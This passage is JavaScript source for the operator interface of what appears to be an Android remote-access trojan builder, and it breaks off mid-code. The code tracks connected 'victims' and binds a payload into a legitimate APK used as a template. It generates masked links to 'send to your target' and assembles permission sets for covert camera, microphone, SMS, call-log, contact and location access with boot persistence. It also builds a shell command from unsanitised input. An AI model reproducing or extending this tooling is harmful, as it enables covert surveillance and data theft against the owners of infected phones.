var app = angular.module('myapp', []);
const { remote } = require('electron');
var dialog = remote.dialog;
const { ipcRenderer } = require('electron');
var fs = require('fs-extra')
var victimsList = remote.require('./main');
const CONSTANTS = require(__dirname + '/assets/js/Constants')
var homedir = require('node-homedir');
const { dirname } = require('path');
var path = require("path");
var exec = require('child_process').exec, child;
//--------------------------------------------------------------
var viclist = {};
var dataPath = path.join(homedir(), CONSTANTS.dataDir);
var downloadsPath = path.join(dataPath, CONSTANTS.downloadPath);
var outputPath = path.join(dataPath, CONSTANTS.outputApkPath);
var logPath = path.join(dataPath, CONSTANTS.outputLogsPath);
//--------------------------------------------------------------



// App Controller for (index.html)
app.controller("AppCtrl", ($scope) => {
    $appCtrl = $scope;
    $appCtrl.victims = viclist;
    $appCtrl.isVictimSelected = true;
    $appCtrl.bindApk = { enable: false, method: 'BOOT' }; //default values for binding apk
    //$appCtrl.permissionsCustom = method: 'BOOT'; //default value for permissions of apk
    var log = document.getElementById("log");
    $appCtrl.logs = [];
    $('.menu .item')
        .tab();
    $('.ui.dropdown')
        .dropdown();

    const window = remote.getCurrentWindow();
    $appCtrl.close = () => {
        window.close();
    };

    $appCtrl.minimize = () => {
        window.minimize();
    };

    $appCtrl.maximize = () => {
      window.maximize();
    };

    // when user clicks Listen button
    $appCtrl.Listen = (port) => {
        if (!port) {
            port = CONSTANTS.defaultPort;
        }

        // notify the main proccess about the port and let him start listening
        ipcRenderer.send("SocketIO:Listen", port);
        $appCtrl.Log("Listening on port => " + port, CONSTANTS.logStatus.SUCCESS);
    }


    // fired when main proccess (main.js) sends any new notification about new victim
    ipcRenderer.on('SocketIO:NewVictim', (event, index) => {
        // add the new victim to the list
        viclist[index] = victimsList.getVictim(index);
        $appCtrl.Log("New victim from " + viclist[index].ip);
        $appCtrl.$apply();
    });


    // fired if listening brings error
    ipcRenderer.on("SocketIO:Listen", (event, error) => {
        $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
        $appCtrl.isListen = false;
        $appCtrl.$apply()
    });


    // fired when main proccess (main.js) send any new notification about disconnected victim
    ipcRenderer.on('SocketIO:RemoveVictim', (event, index) => {
        $appCtrl.Log("Victim disconnected " + viclist[index].ip);
        // delete him from list
        delete viclist[index];
        $appCtrl.$apply();
    });


    // notify the main proccess (main.js) to open the lab
    $appCtrl.openLab = (index) => {
        ipcRenderer.send('openLabWindow', 'lab.html', index);
    }

    // stop listening when user clicks the Stop button
    $appCtrl.Stop = (event) => {
        ipcRenderer.removeAllListeners("SocketIO:Listen", event);
        $appCtrl.Log("Stopped listening");
      }


    // app logs to print any new log in the black terminal
    $appCtrl.Log = (msg, status) => {
        var fontColor = CONSTANTS.logColors.DEFAULT;
        if (status == CONSTANTS.logStatus.SUCCESS)
            fontColor = CONSTANTS.logColors.GREEN;
        else if (status == CONSTANTS.logStatus.FAIL)
            fontColor = CONSTANTS.logColors.RED;
        else if (status == CONSTANTS.logStatus.INFO)
            fontColor = CONSTANTS.logColors.YELLOW;

        $appCtrl.logs.push({ date: new Date().toLocaleString(), msg: msg, color: fontColor });
        log.scrollTop = log.scrollHeight;
        if (!$appCtrl.$$phase)
            $appCtrl.$apply();
    }

  //function to open the dialog and choose apk to be bound
  $appCtrl.BrowseApk = () => {
      dialog.showOpenDialog({ 
          properties: ['openFile'], 
          title: 'Choose APK to bind', 
          buttonLabel: 'Select APK',
          filters: [
              { name: 'Android APK', extensions: ['apk'] } //only select apk files
          ]
      }).then(result => { 
          if(result.canceled) {
              $appCtrl.Log("No APK Was Selected as a Template", CONSTANTS.logStatus.FAIL); //if user cancels the dialog
          } else {
            var apkName = result.filePaths[0].split('/').pop(); //get the name of the apk
            $appCtrl.Log('"'+apkName+'"' + " Was Chosen as a Template", CONSTANTS.logStatus.INFO); //when the user selects an apk
              $appCtrl.Log(); // Empty log line for space between logs
              readFile(result.filePaths[0]); 
          }
      }).catch(() => { 
          $appCtrl.Log("No APK Was Selected as a Template"); //if user cancels the dialog
      })

      function readFile(filepath) {
          $appCtrl.filePath = filepath;
          $appCtrl.$apply();
      }
  }

    // function to run mask python file
    $appCtrl.callmaskpy = () => {
          var targetmask = document.getElementById('targeturl').value
          var hiddenmask = document.getElementById('hiddenurl').value          
          var keywordmask = "-"
          child = exec("python3 ./app/app/Factory/maskurl.py --target "+targetmask+" --mask "+hiddenmask+" --keywords "+keywordmask,
            function (error, stdout, stderr) {
                //console.log('stdout: ' + stdout);
                //console.log('stderr: ' + stderr);
                if (error !== null) {
                    if (targetmask.length == 0){
                        $appCtrl.Log('Please Input The Desired URL To Be Hidden', CONSTANTS.logStatus.FAIL);
                        }
                    if (hiddenmask.length == 0){
                        $appCtrl.Log('Please Input the URL To Hide By', CONSTANTS.logStatus.FAIL);
                        }
                        return;
                        
                    }
                if (stdout.length != 0) {
                    $appCtrl.Log('Generating Link' + '...');
                    $appCtrl.Log('Link Generated Successfully.', CONSTANTS.logStatus.SUCCESS);
                    $appCtrl.Log('Copy the URL below, then send it to your target.', CONSTANTS.logStatus.SUCCESS);
                    $appCtrl.Log(stdout);

                    //console.log('exec error: ' + error);
                    return;

    
                }
            });
    }



    // function to build the apk and sign it
    $appCtrl.GenerateApk = (apkFolder) => {
        var checkBoxofCamera = document.getElementById("Permissions1");
        var checkBoxofStorage = document.getElementById("Permissions2");
        var checkBoxofMic = document.getElementById("Permissions3");
        var checkBoxofLocation = document.getElementById("Permissions4");
        var checkBoxofContacts = document.getElementById("Permissions5");
        var checkBoxofSms = document.getElementById("Permissions6"); 
        var checkBoxofCallsLogs = document.getElementById("Permissions7");
        //if all unchecked
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = CONSTANTS.permissions
        }
        //if all checked
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = CONSTANTS.permissions
        }
        //if only one selected
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>            
`
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>           
    ` 
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        
    ` 
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>       
    ` 
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/> ` 
        }        

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>   
            `
        }        
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>   
            ` 
        }  
        //if six checked
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>  
            ` 
        }  
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>`          
        }  
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         ` 
        }  
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         ` 
        }  
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         ` 
        }
        //if two are checked 
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>         `
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>         ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>         ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>         ` 
        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.CAMERA"/>
